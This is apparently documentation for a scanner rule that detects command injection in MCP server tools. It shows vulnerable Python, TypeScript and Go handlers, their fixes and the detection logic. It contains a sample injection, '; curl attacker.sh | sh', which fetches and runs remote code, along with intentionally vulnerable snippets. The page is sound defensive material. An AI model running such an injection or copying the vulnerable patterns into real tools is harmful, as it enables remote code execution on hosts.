# MCPG004: command-injection

**Default severity:** critical (shell / eval), high (model chooses the program) · **CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html) · **OWASP:** [MCP05, LLM05, ASI05](../owasp.md)

A model-controlled value is interpolated into a shell command, evaluated as code, or used as the program to execute. Tool arguments come from the LLM, so anyone who can influence the conversation or the content the model reads can run commands on the host. A single `; curl attacker.sh | sh` is enough.

## Vulnerable

```python
@mcp.tool()
def git_log(branch: str) -> str:
    return subprocess.run(f"git log {branch}", shell=True, capture_output=True, text=True).stdout
```

```ts
const execAsync = promisify(exec);
server.tool("list_dir", "List a directory", { dir: z.string() },
  async ({ dir }) => { const { stdout } = await execAsync(`ls -la ${dir}`); /* ... */ });
```

```go
out, _ := exec.CommandContext(ctx, "sh", "-c", "ping -c 1 "+host).CombinedOutput()
```

## Fixed

Run a fixed program with an argument list and no shell, and put user values after `--` so they cannot become flags:

```python
subprocess.run(["git", "log", "--oneline", "--", branch], capture_output=True, text=True)
```

```ts
await execFileAsync("ls", ["-la", "--", dir]);
```

```go
exec.CommandContext(ctx, "ping", "-c", "1", "--", host)
```

If the model must choose the program, check it against an explicit allowlist first. If a shell is unavoidable, quote every value (`shlex.quote`). Never `eval`/`exec` tool input.

## How it is detected

Tool parameters (and values assigned from them) reaching `os.system`, `os.popen`, `subprocess.*(shell=True)`, `asyncio.create_subprocess_shell`, `eval`/`exec`, `child_process.exec`/`execSync` (including promisified variants), `spawn(..., { shell: true })`, `new Function`, `vm.run*`, or `exec.Command("sh", "-c", ...)`. Passing a parameter as the *program* of `subprocess.run([...])`, `spawn`, `execFile` or `exec.Command` is reported as high unless the handler checks an allowlist. `shlex.quote`/`shell-quote` break the flow.
